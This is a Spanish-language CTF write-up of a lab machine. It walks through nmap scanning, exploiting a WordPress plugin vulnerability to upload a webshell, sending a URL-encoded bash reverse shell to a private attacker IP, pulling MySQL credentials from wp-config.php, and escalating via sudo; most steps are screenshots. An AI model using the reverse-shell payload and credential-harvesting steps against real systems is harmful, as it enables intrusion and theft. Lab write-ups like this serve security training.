# CTF-ACEITUNE
Solutions de machines CTF
---
Autor--PatrónHacker
---
Descripción
- Explotación de plugin de WordPress (CVE-2021-24946 / Exploit-DB 49967)
- Reverse shell (BusyBox)
- Extracción de credenciales desde wp-config.php
- Abuso de privilegios en sudoers (binario most)
---

<img width="1024" height="1024" alt="image" src="https://github.com/user-attachments/assets/d481416d-9958-448e-82c8-5898f301031e" />

---

# Reconocimiento 

Traza ICMP

<img width="526" height="144" alt="image" src="https://github.com/user-attachments/assets/720a209c-b9c8-490d-9239-59a22ea32e27" />

---

Escaneo de puertos, servicios y versiones

nmap -sS -sC -sV -p- --open --min-rate 5000 -vvv -n -Pn 192.168.100.30

<img width="679" height="501" alt="image" src="https://github.com/user-attachments/assets/265c3927-2dc3-45bd-856b-1d2e07e2833e" />

---

# Análisis de Vulnerabilidades
Analizando Puerto 80

<img width="669" height="560" alt="image" src="https://github.com/user-attachments/assets/1724b504-4018-44ed-ac3c-a9f4e7bb666f" />

---

Analizando pagina web 

<img width="666" height="334" alt="image" src="https://github.com/user-attachments/assets/8d9db24d-bd35-420a-aca4-125eb9fd8d67" />

---

Analizamos Metasploit Framework

<img width="517" height="128" alt="image" src="https://github.com/user-attachments/assets/4102cd68-8590-463c-a8c5-3ba2ef7717b9" />

---

<img width="621" height="345" alt="Captura de pantalla 2026-10-31 183525" src="https://github.com/user-attachments/assets/edf048fc-6254-4d6e-9850-56f33191c41d" />

---

# Explotación de la vulnerabilidad

Buscamos el exploit

<img width="822" height="312" alt="image" src="https://github.com/user-attachments/assets/ba5ff48e-16f3-4525-9e48-7745beb52021" />

---

Vamos a copiarnos este Exploit 


<img width="861" height="201" alt="image" src="https://github.com/user-attachments/assets/6a316d62-75f1-4f7d-a329-eb6d528aa0f2" />

---

Cargamos la webshell


<img width="676" height="120" alt="image" src="https://github.com/user-attachments/assets/bad043a8-5746-4e1c-bf32-94889e7675b0" />

---

Usamos el Exploit como lo indica

<img width="937" height="460" alt="image" src="https://github.com/user-attachments/assets/a5465b9e-f575-47d3-ab91-f82541ce1d88" />

---

Vamos a ponernos en escucha y una stty

nc -lvnp 1998

<img width="660" height="285" alt="image" src="https://github.com/user-attachments/assets/82fbb1e8-b4a6-4c67-817b-ffcfdbcdda7d" />

---

Vamos a enviar una Reverse Shell

<img width="527" height="356" alt="image" src="https://github.com/user-attachments/assets/b54ee110-72d9-43fe-a268-28eba75433ae" />

---

bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.100.22%2F1998%200%3E%261

---

# Post Explotación

WordPress. Este archivo se llama wp-config.php.

<img width="651" height="71" alt="image" src="https://github.com/user-attachments/assets/6c7f8e56-cbb1-4b16-841b-529b5d4ba05d" />

---

Cat y encontrar las credenciales de ingreso a mysql

<img width="820" height="479" alt="image" src="https://github.com/user-attachments/assets/94ec68bd-949a-4c72-83e3-4b9b5ac98875" />

---

Acceso a mysql

<img width="658" height="190" alt="image" src="https://github.com/user-attachments/assets/560b3f4b-0a42-4ba9-a684-d8ddedf74da5" />

---

Mostramos las bases de datos

<img width="319" height="183" alt="image" src="https://github.com/user-attachments/assets/c1fb21a3-96ea-41fb-9f65-ab2956aa8da2" />

---

Usamos la bases de datos y vemos sus tablas

<img width="329" height="516" alt="image" src="https://github.com/user-attachments/assets/27e39609-8b21-4825-b755-20481990f716" />

---

Ingresamos a la tabla que es diferente

<img width="434" height="144" alt="image" src="https://github.com/user-attachments/assets/5063cbad-a0f7-4488-895f-91198f3575b1" />

---

Hemos explotado el puerto 80; el puerto 3306 de mysql y ahora toca el explotar el puerto 22 ssh

Explotamos el puerto 22 ssh

<img width="655" height="405" alt="image" src="https://github.com/user-attachments/assets/c3e4f594-e38b-45f6-9582-c659f36d02f2" />

---


# Escalamos privilegios

<img width="659" height="165" alt="image" src="https://github.com/user-attachments/assets/5e087806-a5bc-466c-84f4-d1f60f62c0e6" />

---

Con línea encontramos la flag

<img width="581" height="46" alt="image" src="https://github.com/user-attachments/assets/ec00027a-1761-46ed-ba87-b8252c6fbd97" />

---

